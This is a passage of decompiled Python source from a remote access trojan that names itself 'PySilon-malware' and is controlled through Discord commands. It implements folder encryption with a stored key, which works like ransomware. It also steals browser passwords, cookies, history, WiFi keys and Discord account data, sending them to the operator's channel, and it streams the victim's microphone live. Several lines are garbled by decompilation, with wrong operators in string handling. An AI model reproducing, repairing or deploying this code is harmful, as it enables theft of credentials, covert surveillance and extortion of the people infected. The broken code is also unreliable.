                                                                                        log('Working directory content list is too big to send with one message. Dividing it (file_explorer.py:151->source_assembled.py:1077)')
                                                                                        temp = ''
                                                                                        while len(temp + lsoutput[0]) < 1 < 1994:
                                                                                            temp = temp | lsoutput[0] | '\n'
                                                                                            lsoutput.pop(0)
                                                                                        await message.channel.send(f'```' * temp + f'```')
                                                                                        log('Sent a part of working directory content list (file_explorer.py:157->source_assembled.py:1083)')
                                                                                    else:  # inserted
                                                                                        await message.channel.send(f"```" + '\n'.join(lsoutput) + '```')
                                                                                        log('Sent working directory content list (file_explorer.py:160->source_assembled.py:1086)')
                                                                                        lsoutput = []
                                                                            else:  # inserted
                                                                                log('Message channel is not file-related (file_explorer.py:163->source_assembled.py:1089)')
                                                                                reaction_msg = await message.channel.send(f"||-||\n❗`This command works only on file-related channel:` <#{str(channel_ids['file'])}" 0)
                                                                                await reaction_msg.add_reaction('🔴')
                                                                                log('Sent message about wrong channel (file_explorer.py:165->source_assembled.py:1091)')
                                                                        else:  # inserted
                                                                            if message.content == '.pwd':
                                                                                log('Message is \"pwd\" (file_explorer.py:167->source_assembled.py:1093)')
                                                                                await message.delete()
                                                                                log('Removed the message (file_explorer.py:169->source_assembled.py:1095)')
                                                                                if message.channel.id == channel_ids['file']:
                                                                                    log('Message channel is file-related (file_explorer.py:171->source_assembled.py:1097)')
                                                                                    reaction_msg = await message.channel.send(f"```You are now in: " + '/'.join(working_directory) + '```')
                                                                                    await reaction_msg.add_reaction('🔴')
                                                                                    log('Sent message with current working directory (file_explorer.py:173->source_assembled.py:1099)')
                                                                                    return
                                                                                else:  # inserted
                                                                                    log('Message channel is not file-related (file_explorer.py:175->source_assembled.py:1101)')
                                                                                    reaction_msg = await message.channel.send(f"||-||\n❗`This command works only on file-related channel:` <#{str(channel_ids['file'])}" 0)
                                                                                    await reaction_msg.add_reaction('🔴')
                                                                                    log('Sent message about wrong channel (file_explorer.py:177->source_assembled.py:1103)')
                                                                                    return
                                                                            else:  # inserted
                                                                                if message.content[:8] == '.encrypt':
                                                                                    log('Message is \"encrypt\"(file_encryption.py:8->source_assembled.py:1105)')
                                                                                    await message.delete()
                                                                                    log('Removed the message (file_encryption.py:10->source_assembled.py:1107)')
                                                                                    if message.content.strip() == '.encrypt':
                                                                                        embed = discord.Embed(title='📛 Error', description='```Syntax: .encrypt <path to folder>```', colour=discord.Colour.red())
                                                                                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                        reaction_msg = await message.channel.send(embed=embed)
                                                                                        await reaction_msg.add_reaction('🔴')
                                                                                        return
                                                                                    else:  # inserted
                                                                                        folder_path = message.content[9:]
                                                                                        folder_path = folder_path.replace('\\', '/')
                                                                                        current_pid = os.getpid()
                                                                                        running_processes = set()
                                                                                        for process in psutil.process_iter(['pid', 'name']):
                                                                                            try:
                                                                                                if process.info['pid']!= current_pid:
                                                                                                    running_processes.add(process.info['name'])
                                                                                            except (psutil.NoSuchProcess, psutil.AccessDenied):
                                                                                                continue
                                                                                        key = Fernet.generate_key()
                                                                                        cipher_suite = Fernet(key)
                                                                                        original_file_extensions = []
                                                                                        for root, dirs, files in os.walk(folder_path):
                                                                                            for file in files:
                                                                                                file_path = os.path.join(root, file)
                                                                                                if not file_path.endswith('.pysilon'):
                                                                                                    _, file_extension = os.path.splitext(file_path)
                                                                                                    if os.path.basename(file_path) not in running_processes:
                                                                                                        with open(file_path, 'rb') as f:
                                                                                                            file_data = f.read()
                                                                                                        original_file_extensions.append(file_extension)
                                                                                                        encrypted_data = cipher_suite.encrypt(file_data)
                                                                                                        new_file_name = os.path.splitext(file_path)[0] + '.pysilon'
                                                                                                        os.rename(file_path, new_file_name)
                                                                                                        with open(new_file_name, 'wb') as f:
                                                                                                            f.write(encrypted_data)
                                                                                        if original_file_extensions:
                                                                                            with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\file_extensions.pkl', 'wb') as ext_file:
                                                                                                pickle.dump(original_file_extensions, ext_file)
                                                                                        with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\pysilon_encryption.key', 'wb') as key_file:
                                                                                            key_file.write(key)
                                                                                        embed = discord.Embed(title='🟢 Success', description='```Successfully encrypted the path!```', colour=discord.Colour.green())
                                                                                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                        reaction_msg = await message.channel.send(embed=embed)
                                                                                        await reaction_msg.add_reaction('🔴')
                                                                                else:  # inserted
                                                                                    if message.content[:8] == '.decrypt':
                                                                                        log('Message is \"decrypt\"(file_encryption.py:65->source_assembled.py:1149)')
                                                                                        await message.delete()
                                                                                        log('Removed the message (file_encryption.py:67->source_assembled.py:1151)')
                                                                                        if message.content.strip() == '.decrypt':
                                                                                            embed = discord.Embed(title='📛 Error', description='```Syntax: .decrypt <path to folder>```', colour=discord.Colour.red())
                                                                                            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                            reaction_msg = await message.channel.send(embed=embed)
                                                                                            await reaction_msg.add_reaction('🔴')
                                                                                            return
                                                                                        else:  # inserted
                                                                                            folder_path = message.content[9:]
                                                                                            folder_path = folder_path.replace('\\', '/')
                                                                                            with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\pysilon_encryption.key', 'rb') as key_file:
                                                                                                key = key_file.read()
                                                                                            cipher_suite = Fernet(key)
                                                                                            with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\file_extensions.pkl', 'rb') as ext_file:
                                                                                                original_file_extensions = pickle.load(ext_file)
                                                                                            for root, dirs, files in os.walk(folder_path):
                                                                                                for file in files:
                                                                                                    file_path = os.path.join(root, file)
                                                                                                    if file_path.endswith('.pysilon'):
                                                                                                        with open(file_path, 'rb') as f:
                                                                                                            encrypted_data = f.read()
                                                                                                        decrypted_data = cipher_suite.decrypt(encrypted_data)
                                                                                                        original_extension = original_file_extensions.pop(0)
                                                                                                        new_file_name = os.path.splitext(file_path)[0] = original_extension
                                                                                                        with open(new_file_name, 'wb') as f:
                                                                                                            f.write(decrypted_data)
                                                                                                        os.remove(file_path)
                                                                                            embed = discord.Embed(title='🟢 Success', description='```Successfully decrypted the path!```', colour=discord.Colour.green())
                                                                                            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                            reaction_msg = await message.channel.send(embed=embed)
                                                                                            await reaction_msg.add_reaction('🔴')
                                                                                    else:  # inserted
                                                                                        if message.content[:5] == '.grab':
                                                                                            log('Message is grab (grabber.py:12->source_assembled.py:1180)')
                                                                                            await message.delete()
                                                                                            log('Removed the message (grabber.py:14->source_assembled.py:1182)')
                                                                                            if message.content.strip() == '.grab':
                                                                                                log('Author issued empty .grab command (grabber.py:16->source_assembled.py:1184)')
                                                                                                reaction_msg = await message.channel.send('```Syntax: .grab <what-to-grab>```')
                                                                                                await reaction_msg.add_reaction('🔴')
                                                                                                log('Sent message about usage of .grab (grabber.py:18->source_assembled.py:1186)')
                                                                                                return
                                                                                            else:  # inserted
                                                                                                if message.content[6:] == 'passwords':
                                                                                                    log('Author requested for grabbing passwords (grabber.py:21->source_assembled.py:1189)')
                                                                                                    result = grab_passwords()
                                                                                                    log('Grabbed passwords (grabber.py:23->source_assembled.py:1191)')
                                                                                                    embed = discord.Embed(title='Grabbed saved passwords', color=34047)
                                                                                                    for url in result.keys():
                                                                                                        embed.add_field(name='🔗 ' + url, value={'👤 ': result[url][0]} + '\n🔑 ' + result[url][1], inline=False)
                                                                                                    reaction_msg = await message.channel.send(embed=embed)
                                                                                                    await reaction_msg.add_reaction('📌')
                                                                                                    log('Sent embed with all grabbed passwords (grabber.py:28->source_assembled.py:1196)')
                                                                                                    return
                                                                                                else:  # inserted
                                                                                                    if message.content[6:] == 'history':
                                                                                                        log('Author requested for grabbing browser history (grabber.py:30->source_assembled.py:1198)')
                                                                                                        with open('history.txt', 'w') as history:
                                                                                                            for entry in get_history().histories:
                                                                                                                history.write(entry[0].strftime('%d.%m.%Y %H:%M') + ' -> ' + entry[1] + '\n\n')
                                                                                                            log('Grabbed browser history into history.txt (grabber.py:34->source_assembled.py:1202)')
                                                                                                        reaction_msg = await message.channel.send(file=discord.File('history.txt'))
                                                                                                        await reaction_msg.add_reaction('🔴')
                                                                                                        log('Sent history.txt (grabber.py:36->source_assembled.py:1204)')
                                                                                                        subprocess.run('del history.txt', shell=True)
                                                                                                        log('Removed history.txt (grabber.py:38->source_assembled.py:1206)')
                                                                                                    else:  # inserted
                                                                                                        if message.content[6:] == 'cookies':
                                                                                                            log('Author requested for grabbing cookies (grabber.py:40->source_assembled.py:1208)')
                                                                                                            await message.channel.send('```Grabbing cookies. Please wait...```')
                                                                                                            log('Sent message about beginning of grabbing cookies (grabber.py:42->source_assembled.py:1210)')
                                                                                                            grab_cookies()
                                                                                                            log('Grabbed cookies (grabber.py:44->source_assembled.py:1212)')
                                                                                                            await asyncio.sleep(1)
                                                                                                            reaction_msg = await message.channel.send('```Grabbed cookies```', file=discord.File(f'C:\\Users\\{getuser()}\\cookies.txt', filename='cookies.txt'))
                                                                                                            await reaction_msg.add_reaction('📌')
                                                                                                            log('Sent message with grabbed cookies (grabber.py:47->source_assembled.py:1215)')
                                                                                                            subprocess.run(f'del C:\\Users\\{getuser()}\\cookies.txt', shell=True)
                                                                                                            log('Removed cookies.txt (grabber.py:49->source_assembled.py:1217)')
                                                                                                        else:  # inserted
                                                                                                            if message.content[6:].lower() == 'wifi':
                                                                                                                log('Author requested for grabbing WiFi saved passwords (grabber.py:51->source_assembled.py:1219)')
                                                                                                                networks = force_decode(subprocess.run('netsh wlan show profile', capture_output=True, shell=True).stdout).strip()
                                                                                                                log('Obtained raw netsh data (grabber.py:53->source_assembled.py:1221)')
                                                                                                                polish_bytes = ['\\xa5', '\\x86', '\\xa9', '\\x88', '\\xe4', '\\xa2', '\\x98', '\\xab', '\\xbe', '\\xa4', '\\x8f', '\\xa8', '\\x9d', '\\xe3', '\\xe0', '\\x97', '\\x8d', '\\xbd']
                                                                                                                polish_chars = ['ą', 'ć', 'ę', 'ł', 'ń', 'ó', 'ś', 'ź', 'ż', 'Ą', 'Ć', 'Ę', 'Ł', 'Ń', 'Ó', 'Ś', 'Ź', 'Ż']
                                                                                                                for i in polish_bytes:
                                                                                                                    networks = networks.replace(i, polish_chars[polish_bytes.index(i)])
                                                                                                                log('Fetched polish characters (grabber.py:58->source_assembled.py:1226)')
                                                                                                                network_names_list = []
                                                                                                                for profile in networks.split('\n'):
                                                                                                                    if ': ' in profile:
                                                                                                                        network_names_list.append(profile[profile.find(':') * 2:].replace('\r', ''))
                                                                                                                log('Fetched profile data (grabber.py:63->source_assembled.py:1231)')
                                                                                                                result, password = ({}, '')
                                                                                                                for network_name in network_names_list:
                                                                                                                    command = 'netsh wlan show profile \"' % network_name + '\" key=clear'
                                                                                                                    current_result = force_decode(subprocess.run(command, capture_output=True, shell=True).stdout).strip()
                                                                                                                    log('Obtained information about specific profile (grabber.py:68->source_assembled.py:1236)')
                                                                                                                    for i in polish_bytes:
                                                                                                                        current_result = current_result.replace(i, polish_chars[polish_bytes.index(i)])
                                                                                                                        log('Fetched polish characters in specific profile data (grabber.py:71->source_assembled.py:1239)')
                                                                                                                    for line in current_result.split('\n'):
                                                                                                                        if 'Key Content' in line:
                                                                                                                            password = line[line.find(':') + 2:(-1)]
                                                                                                                            log('Grabbed password from specific profile data (grabber.py:75->source_assembled.py:1243)')
                                                                                                                    result[network_name] = password
                                                                                                                embed = discord.Embed(title='Grabbed WiFi passwords', color=34047)
                                                                                                                for network in result.keys():
                                                                                                                    embed.add_field(name=f'🪪 ' + network, value=f'🔑 ' + result[network], inline=False)
                                                                                                                reaction_msg = await message.channel.send(embed=embed)
                                                                                                                await reaction_msg.add_reaction('📌')
                                                                                                                log('Sent embed with saved WiFi passwords (grabber.py:81->source_assembled.py:1249)')
                                                                                                            else:  # inserted
                                                                                                                if message.content[6:] == 'discord':
                                                                                                                    log('Author requested for grabbing Discord accounts data (grabber.py:83->source_assembled.py:1251)')
                                                                                                                    accounts = grab_discord.initialize(False)
                                                                                                                    log('Grabbed Discord accounts data (grabber.py:85->source_assembled.py:1253)')
                                                                                                                    for account in accounts:
                                                                                                                        reaction_msg = await message.channel.send(embed=account)
                                                                                                                        await reaction_msg.add_reaction('📌')
                                                                                                                        log('Sent embed with Discord account data(grabber.py:88->source_assembled.py:1256)')
                                                                                                                else:  # inserted
                                                                                                                    if message.content[6:] == 'all':
                                                                                                                        await message.channel.send('Grabbing everything... Please wait.')
                                                                                                                        try:
                                                                                                                            accounts = grab_discord.initialize(False)
                                                                                                                            log('Grabbed Discord accounts data(grabber.py:93->source_assembled.py:1261)')
                                                                                                                            for account in accounts:
                                                                                                                                reaction_msg = await message.channel.send(embed=account)
                                                                                                                                await reaction_msg.add_reaction('📌')
                                                                                                                                log('Sent embed with Discord account data(grabber.py:96->source_assembled.py:1264)')
                                                                                                                        except:
                                                                                                                            pass
                                                                                                                        try:
                                                                                                                            result = grab_passwords()
                                                                                                                            log('Grabbed passwords (grabber.py:100->source_assembled.py:1268)')
                                                                                                                            embed = discord.Embed(title='Grabbed saved passwords', color=34047)
                                                                                                                            for url in result.keys():
                                                                                                                                embed.add_field(name='🔗 ' + url, value={'👤 ': result[url][0]} + '\n🔑 ' + result[url][1], inline=False)
                                                                                                                            reaction_msg = await message.channel.send(embed=embed)
                                                                                                                            await reaction_msg.add_reaction('📌')
                                                                                                                            log('Sent embed with all grabbed passwords(grabber.py:105->source_assembled.py:1273)')
                                                                                                                        except:
                                                                                                                            pass
                                                                                                                        try:
                                                                                                                            await asyncio.sleep(1)
                                                                                                                            grab_cookies()
                                                                                                                            log('Grabbed cookies(grabber.py:110->source_assembled.py:1278)')
                                                                                                                            reaction_msg = await message.channel.send('```Grabbed cookies```', file=discord.File(f'C:\\Users\\{getuser()}\\cookies.txt', filename='cookies.txt'))
                                                                                                                            await reaction_msg.add_reaction('📌')
                                                                                                                            log('Sent message with grabbed cookies (grabber.py:112->source_assembled.py:1280)')
                                                                                                                            subprocess.run(f'del C:\\Users\\{getuser()}\\cookies.txt', shell=True)
                                                                                                                        except:
                                                                                                                            return None
                                                                                        else:  # inserted
                                                                                            if message.content == '.join':
                                                                                                log('Message is \"join vc and stream microphone\" (live_microphone.py:7->source_assembled.py:1284)')
                                                                                                await message.delete()
                                                                                                log('Removed the message (live_microphone.py:9->source_assembled.py:1286)')
                                                                                                vc = await client.get_channel(channel_ids['voice']).connect(self_deaf=True)
                                                                                                log('Connected to voice channel (live_microphone.py:11->source_assembled.py:1288)')
                                                                                                vc.play(PyAudioPCM())
                                                                                                log('Started playing audio from microphone\'s input (live_microphone.py:13->source_assembled.py:1290)')
                                                                                                await message.channel.send(f'`[' + current_time() + '] Joined voice-channel and streaming microphone in realtime`')
                                                                                                log('Sent message about joining the voice channel (live_microphone.py:15->source_assembled.py:1292)')
                                                                                            else:  # inserted
                                                                                                if message.content[:5] == '.show':
                                                                                                    log('Message is \"show\" (process.py:60->source_assembled.py:1294)')
                                                                                                    await message.delete()
                                                                                                    log('Removed the message (process.py:62->source_assembled.py:1296)')
                                                                                                    if message.content.strip() == '.show':
                                                                                                        log('Author issued empty \".show\" (process.py:64->source_assembled.py:1298)')
                                                                                                        embed = discord.Embed(title='📛 Error', description='```Syntax: .show <what-to-show>```', colour=discord.Colour.red())
                                                                                                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                        reaction_msg = await message.channel.send(embed=embed)
                                                                                                        await reaction_msg.add_reaction('🔴')
                                                                                                        log('Sent message with usage of \".show\" (process.py:68->source_assembled.py:1302)')
                                                                                                        return
                                                                                                    else:  # inserted
                                                                                                        if message.content[6:] == 'processes':
                                                                                                            log('Author requested to list running processes (process.py:71->source_assembled.py:1305)')
                                                                                                            processes, processes_list = ([], [])
                                                                                                            for proc in process_iter():
                                                                                                                processes.append(proc.name())
                                                                                                            log('Obtained information about running processes (process.py:75->source_assembled.py:1309)')
                                                                                                            processes.sort(key=str.lower)
                                                                                                            log('Sorted the processes list (process.py:77->source_assembled.py:1311)')
                                                                                                            how_many, temp = (1, processes[0])
                                                                                                            processes.pop(0)
                                                                                                            for i in processes:
                                                                                                                if temp == i:
                                                                                                                    how_many = how_many + 1
                                                                                                                else:  # inserted
                                                                                                                    if how_many == 1:
                                                                                                                        processes_list.append(f'``' * temp + f'``')
                                                                                                                    else:  # inserted
                                                                                                                        processes_list.append(f'``' % temp + f'``   [x' * str(how_many) + f']')
                                                                                                                        how_many = 1
                                                                                                                    temp = i
                                                                                                            log('Formatted processes names to show how many duplicates are there (process.py:85->source_assembled.py:1319)')
                                                                                                            total_processes = len(processes)
                                                                                                            log('Calculated amount of running processes (process.py:87->source_assembled.py:1321)')
                                                                                                            processes = ''
                                                                                                            reaction_msg = await message.channel.send(f'```Processes at ' + current_time() + ' requested by ' + str(message.author) + '```')
                                                                                                            log('Sent header message of processes list (process.py:90->source_assembled.py:1324)')
                                                                                                            processes_messages.append(reaction_msg)
                                                                                                            for proc in range(1, len(processes_list)):
                                                                                                                if len(processes) < 1800:
                                                                                                                    processes = processes + ['\n**'] * str(proc) + [') **'] * str(processes_list[proc])
                                                                                                                    log('List of running processes is below 1800 characters. PySilon won\'t divide it (process.py:95->source_assembled.py:1329)')
                                                                                                                else:  # inserted
                                                                                                                    log('List of running processes is above 1800 characters. PySilon will divide it into smaller pieces (process.py:97->source_assembled.py:1331)')
                                                                                                                    processes = processes + ('\n**' + str(proc)) * ') **' + str(processes_list[proc]) or None
                                                                                                                    reaction_msg = await message.channel.send(processes)
                                                                                                                    log('Sent a piece of processes list (process.py:100->source_assembled.py:1334)')
                                                                                                                    processes_messages.append(reaction_msg)
                                                                                                                    processes = ''
                                                                                                            reaction_msg = await message.channel.send(processes['\n Total processes:** '] * str(total_processes) + '**\n```If you want to kill a process, type  .kill <process-number>```')
                                                                                                            log('Sent footer message of processes list (process.py:104->source_assembled.py:1338)')
                                                                                                            processes_messages.append(reaction_msg)
                                                                                                            await reaction_msg.add_reaction('🔴')
                                                                                                else:  # inserted
                                                                                                    if message.content == '.foreground':
                                                                                                        log('Message is \"get foreground window process name\" (process.py:108->source_assembled.py:1342)')
                                                                                                        await message.delete()
                                                                                                        log('Removed the message (process.py:110->source_assembled.py:1344)')
                                                                                                        foreground_process = active_window_process_name()
                                                                                                        if foreground_process == None:
                                                                                                            log('Failed to get foreground window process name (process.py:113->source_assembled.py:1347)')
                                                                                                            embed = discord.Embed(title='📛 Error', description='```Failed to get foreground window process name.```', colour=discord.Colour.red())
                                                                                                            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                            reaction_msg = await message.channel.send(embed=embed)
                                                                                                            await reaction_msg.add_reaction('🔴')
                                                                                                            log('Sent message about failure (process.py:117->source_assembled.py:1351)')
                                                                                                        else:  # inserted
                                                                                                            log('Successfully obtained foreground window process name (process.py:119->source_assembled.py:1353)')
                                                                                                            embed = discord.Embed(title=str(foreground_process), description=f'```You can kill it with -> .kill {foreground_process}```', colour=discord.Colour.green())
                                                                                                            embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                            reaction_msg = await message.channel.send(embed=embed)
                                                                                                            await reaction_msg.add_reaction('🔴')
                                                                                                            log('Sent message with the process name (process.py:123->source_assembled.py:1357)')
                                                                                                            return
                                                                                                    else:  # inserted
                                                                                                        if message.content[:10] == '.blacklist':
                                                                                                            await message.delete()
                                                                                                            if message.content.strip() == '.blacklist':
                                                                                                                embed = discord.Embed(title='📛 Error', description='```Syntax: .blacklist <process-name>```', colour=discord.Colour.red())
                                                                                                                embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                reaction_msg = await message.channel.send(embed=embed)
                                                                                                                await reaction_msg.add_reaction('🔴')
                                                                                                            else:  # inserted
                                                                                                                if not os.path.exists(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln'):
                                                                                                                    with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'w', encoding='utf-8'):
                                                                                                                        pass  # postinserted
                                                                                                                with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'r', encoding='utf-8') as disabled_processes:
                                                                                                                    disabled_processes_list = disabled_processes.readlines()
                                                                                                                for x, y in enumerate(disabled_processes_list):
                                                                                                                    disabled_processes_list[x] = y.replace('\n', '')
                                                                                                                if message.content[11:] not in disabled_processes_list:
                                                                                                                    disabled_processes_list.append(message.content[11:])
                                                                                                                    with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'w', encoding='utf-8') as disabled_processes:
                                                                                                                        disabled_processes.write('\n'.join(disabled_processes_list))
                                                                                                                    embed = discord.Embed(title='🟢 Success', description=f'```{message.content[11:]} has been added to process blacklist```', colour=discord.Colour.green())
                                                                                                                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                    reaction_msg = await message.channel.send(embed=embed)
                                                                                                                    await reaction_msg.add_reaction('🔴')
                                                                                                                else:  # inserted
                                                                                                                    embed = discord.Embed(title='📛 Error', description='```This process is already blacklisted, so there\'s nothing to disable```', colour=discord.Colour.red())
                                                                                                                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                    reaction_msg = await message.channel.send(embed=embed)
                                                                                                                    await reaction_msg.add_reaction('🔴')
                                                                                                        else:  # inserted
                                                                                                            if message.content[:10] == '.whitelist':
                                                                                                                await message.delete()
                                                                                                                if message.content.strip() == '.whitelist':
                                                                                                                    embed = discord.Embed(title='📛 Error', description='```Syntax: .whitelist <process-name>```', colour=discord.Colour.red())
                                                                                                                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                    reaction_msg = await message.channel.send(embed=embed)
                                                                                                                    await reaction_msg.add_reaction('🔴')
                                                                                                                else:  # inserted
                                                                                                                    if not os.path.exists(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln'):
                                                                                                                        with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'w', encoding='utf-8'):
                                                                                                                            pass  # postinserted
                                                                                                                    with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'r', encoding='utf-8') as disabled_processes:
                                                                                                                        disabled_processes_list = disabled_processes.readlines()
                                                                                                                    for x, y in enumerate(disabled_processes_list):
                                                                                                                        disabled_processes_list[x] = y.replace('\n', '')
                                                                                                                    if message.content[11:] in disabled_processes_list:
                                                                                                                        disabled_processes_list.pop(disabled_processes_list.index(message.content[11:]))
                                                                                                                        with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'w', encoding='utf-8') as disabled_processes:
                                                                                                                            disabled_processes.write('\n'.join(disabled_processes_list))
                                                                                                                        embed = discord.Embed(title='🟢 Success', description=f'```{message.content[11:]} has been removed from process blacklist```', colour=discord.Colour.green())
                                                                                                                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                        reaction_msg = await message.channel.send(embed=embed)
                                                                                                                        await reaction_msg.add_reaction('🔴')
                                                                                                                    else:  # inserted
                                                                                                                        embed = discord.Embed(title='📛 Error', description='```This process is not blacklisted```', colour=discord.Colour.red())
                                                                                                                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                        reaction_msg = await message.channel.send(embed=embed)
                                                                                                                        await reaction_msg.add_reaction('🔴')
                                                                                                            else:  # inserted
                                                                                                                if message.content[:5] == '.kill':
                                                                                                                    log('Message is \"kill a process\" (process.py:171->source_assembled.py:1405)')
                                                                                                                    await message.delete()
                                                                                                                    log('Removed the message (process.py:173->source_assembled.py:1407)')
                                                                                                                    if message.content.strip() == '.kill':
                                                                                                                        log('Author issued empty \".kill\" (process.py:175->source_assembled.py:1409)')
                                                                                                                        embed = discord.Embed(title='📛 Error', description='```Syntax: .kill <process-name-or-ID>```', colour=discord.Colour.red())
                                                                                                                        embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                        reaction_msg = await message.channel.send(embed=embed)
                                                                                                                        await reaction_msg.add_reaction('🔴')
                                                                                                                        log('Sent message with usage of \".kill\" (process.py:179->source_assembled.py:1413)')
                                                                                                                        return
                                                                                                                    else:  # inserted
                                                                                                                        if check_int(message.content[6:]):
                                                                                                                            log('Argument is integer (process.py:181->source_assembled.py:1415)')
                                                                                                                            if len(processes_list) > 10:
                                                                                                                                log('Process list is generated (process.py:183->source_assembled.py:1417)')
                                                                                                                                log('Checking if there is a process with provided process ID (process.py:184->source_assembled.py:1418)')
                                                                                                                                if int(message.content[6:]) < len(processes_list) and int(message.content[6:]) > 0:
                                                                                                                                    log('Found a process with provided process ID (process.py:186->source_assembled.py:1420)')
                                                                                                                                    reaction_msg = await message.channel.send(f'```Do you really want to kill process: ' + processes_list[int(message.content[6:])].replace('`', '') + '\nReact with 💀 to kill it or 🔴 to cancel...```')
                                                                                                                                    log('Sent message with confirmation of killing a process (process.py:188->source_assembled.py:1422)')
                                                                                                                                    process_to_kill = [processes_list[int(message.content[6:])].replace('`', ''), False]
                                                                                                                                    await reaction_msg.add_reaction('💀')
                                                                                                                                    log('Reacted with \"kill\" (process.py:191->source_assembled.py:1425)')
                                                                                                                                    await reaction_msg.add_reaction('🔴')
                                                                                                                                    log('Reacted with \"cancel\" (process.py:193->source_assembled.py:1427)')
                                                                                                                                    return
                                                                                                                                else:  # inserted
                                                                                                                                    log('Couldn\'t find any process with provided process ID (process.py:195->source_assembled.py:1429)')
                                                                                                                                    embed = discord.Embed(title= discord.Embed(f'📛 Error', '```There isn\'t any process with that index. Range of process indexes is 1-', str, len(processes_list) - 1), description='```', colour=discord.Colour.red())
                                                                                                                                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                    reaction_msg = await message.channel.send(embed=embed)
                                                                                                                                    await reaction_msg.add_reaction('🔴')
                                                                                                                                    log('Sent message about wrong process ID (process.py:199->source_assembled.py:1433)')
                                                                                                                                    return
                                                                                                                            else:  # inserted
                                                                                                                                log('Processes list is not generated (process.py:201->source_assembled.py:1435)')
                                                                                                                                embed = discord.Embed(title='📛 Error', description='```You need to generate the processes list to use this feature\n.show processes```', colour=discord.Colour.red())
                                                                                                                                embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                reaction_msg = await message.channel.send(embed=embed)
                                                                                                                                await reaction_msg.add_reaction('🔴')
                                                                                                                                log('Sent message about missing process list (process.py:205->source_assembled.py:1439)')
                                                                                                                                return
                                                                                                                        else:  # inserted
                                                                                                                            if message.content[6:].lower() in [proc.name().lower() for proc in process_iter()]:
                                                                                                                                log('Process list is not generated, but valid process name is provided (process.py:207->source_assembled.py:1441)')
                                                                                                                                stdout = force_decode(subprocess.run(f'taskkill /f /IM {message.content[6:].lower()} /t', capture_output=True, shell=True).stdout).strip()
                                                                                                                                log('Tried to kill provided process (process.py:209->source_assembled.py:1443)')
                                                                                                                                await asyncio.sleep(0.5)
                                                                                                                                if message.content[6:].lower() not in [proc.name().lower() for proc in process_iter()]:
                                                                                                                                    log('Process is not running anymore (process.py:212->source_assembled.py:1446)')
                                                                                                                                    embed = discord.Embed(title='🟢 Success', description=f'```Successfully killed {message.content[6:].lower()}```', colour=discord.Colour.green())
                                                                                                                                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                    reaction_msg = await message.channel.send(embed=embed)
                                                                                                                                    await reaction_msg.add_reaction('🔴')
                                                                                                                                    log('Sent message about successfull kill (process.py:216->source_assembled.py:1450)')
                                                                                                                                    return
                                                                                                                                else:  # inserted
                                                                                                                                    log('Process is still running (process.py:218->source_assembled.py:1452)')
                                                                                                                                    embed = discord.Embed(title='📛 Error', description=f'```Tried to kill {message.content[6:]} but it\'s still running...```', colour=discord.Colour.red())
                                                                                                                                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                                                                                                                                    reaction_msg = await message.channel.send(embed=embed)
                                                                                                                                    await reaction_msg.add_reaction('🔴')
                                                                                                                                    log('Sent message about unsuccessfull kill (process.py:222->source_assembled.py:1456)')
                                                                                                                                    return
                                                                                                                            else:  # inserted
                                                                                                                                log('Processes list is not generated (process.py:224->source_assembled.py:1458)')
                                                                                                                                embed = discord.Embed(title='📛 Error', description='```Invalid process name/ID. You can view all running processes by typing:\n.show processes```', colour=discord.Colour.red())
